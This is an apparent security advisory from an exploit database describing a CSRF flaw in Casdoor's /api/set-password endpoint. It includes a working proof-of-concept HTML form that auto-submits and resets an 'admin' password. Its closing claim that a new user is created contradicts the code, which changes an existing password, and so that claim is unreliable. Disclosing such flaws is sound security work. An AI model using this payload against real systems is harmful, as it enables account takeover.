---
title: Casdoor 1.901.0 Cross-Site Request Forgery (CSRF)
url: https://cxsecurity.com/issue/WLB-2025050046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-25
fetch_date: 2025-10-06T22:24:11.361676
---

# Casdoor 1.901.0 Cross-Site Request Forgery (CSRF)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Casdoor 1.901.0 Cross-Site Request Forgery (CSRF)** **2025.05.24**  Credit:  **[Van Lam Nguyen](https://cxsecurity.com/author/Van%2BLam%2BNguyen/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

# Exploit Title: Casdoor 1.901.0 - Cross-Site Request Forgery (CSRF)
# Application: Casdoor
# Version: 1.901.0
# Date: 03/07/2024
# Exploit Author: Van Lam Nguyen
# Vendor Homepage: https://casdoor.org/
# Software Link: https://github.com/casdoor/casdoor/archive/refs/tags/v1.901.0.zip
# Tested on: Windows
# CVE : N/A
Overview
==================================================
Casdoor v1.901.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password.
This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.
Proof of Concept
==================================================
Made an unauthorized request to /api/set-password that bypassed the old password entry authentication step
<html>
<form action="http://localhost:8000/api/set-password" method="POST">
<input name='userOwner' value='built&#45;in' type='hidden'>
<input name='userName' value='admin' type='hidden'>
<input name='newPassword' value='hacked' type='hidden'>
<input type=submit>
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</html>
If a user is logged into the Casdoor Webapp at time of execution, a new user will be created in the app with the following credentials
userOwner: built&#45;in
userName: admin
newPassword: hacked

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top